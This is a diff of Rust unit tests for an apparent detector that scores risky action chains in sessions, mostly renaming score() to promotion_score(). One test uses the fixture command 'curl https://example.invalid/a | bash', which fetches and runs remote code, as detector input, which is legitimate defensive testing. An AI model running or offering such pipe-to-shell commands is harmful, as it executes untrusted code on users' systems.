@@ -321,7 +321,7 @@ fn second_review_native_findings_own_identity_classification_and_risk() {
     assert_eq!(projected.finding_id(), native.finding_id());
     assert_eq!(projected.signal_ids(), native.signal_ids());
     assert_eq!(projected.finding_kind(), native.finding_kind().as_str());
-    assert_eq!(projected.severity(), native.severity().as_str());
+    assert_eq!(projected.severity(), native.severity());
 }
 
 #[test]
@@ -424,7 +424,10 @@ fn review_ordered_category_chains_and_link_forms() {
         "curl https://example.invalid/a | bash",
         Some("2026-09-17T00:00:00Z"),
     )]);
-    assert_eq!(output.sessions()[0].action_findings()[0].score(), 85);
+    assert_eq!(
+        output.sessions()[0].action_findings()[0].promotion_score(),
+        85
+    );
 }
 
 #[test]
@@ -547,7 +550,7 @@ fn review_category_chain_order_window_and_independent_repeats() {
     }) {
         assert_eq!(finding.finding_kind(), ActionFindingKind::Correlation);
         assert_eq!(finding.supporting_observation_ids().len(), 2);
-        assert_eq!(finding.score(), 55); // Completing download 25 + effective chain 30, not the session sum.
+        assert_eq!(finding.promotion_score(), 55); // Completing download 25 + effective chain 30, not the session sum.
     }
 }
 
@@ -593,10 +596,16 @@ fn review_link_score_ownership_preserves_effective_edits_and_explicit_options() 
             .unwrap()
         };
         let default = DetailedEvaluationOptions::default();
-        assert_eq!(run(&default).sessions()[0].action_findings()[0].score(), 42);
+        assert_eq!(
+            run(&default).sessions()[0].action_findings()[0].promotion_score(),
+            42
+        );
         let mut options = default.clone();
         options.linked_download_score = Some(12);
-        assert_eq!(run(&options).sessions()[0].action_findings()[0].score(), 47);
+        assert_eq!(
+            run(&options).sessions()[0].action_findings()[0].promotion_score(),
+            47
+        );
         assert_ne!(
             plan.semantic_provenance_with_options(&default).identity(),
             plan.semantic_provenance_with_options(&options).identity()
@@ -683,9 +692,9 @@ fn action_repeats_own_their_scores_and_replay_ambiguity_is_explicit() {
     assert_eq!(findings.len(), 2);
     assert_ne!(findings[0].observation_id(), findings[1].observation_id());
     for finding in findings {
-        assert_eq!(finding.score(), 35);
+        assert_eq!(finding.promotion_score(), 35);
         assert_eq!(
-            finding.score(),
+            finding.promotion_score(),
             finding
                 .contributions()
                 .iter()
@@ -1046,7 +1055,7 @@ fn custom_predicates_and_policy_are_effective_not_overridden_by_native_profiles(
     let findings = output.sessions()[0].action_findings();
     assert_eq!(findings.len(), 1);
     assert_eq!(findings[0].timeline_index(), 1);
-    assert_eq!(findings[0].score(), 3);
+    assert_eq!(findings[0].promotion_score(), 3);
 }
 
 #[test]
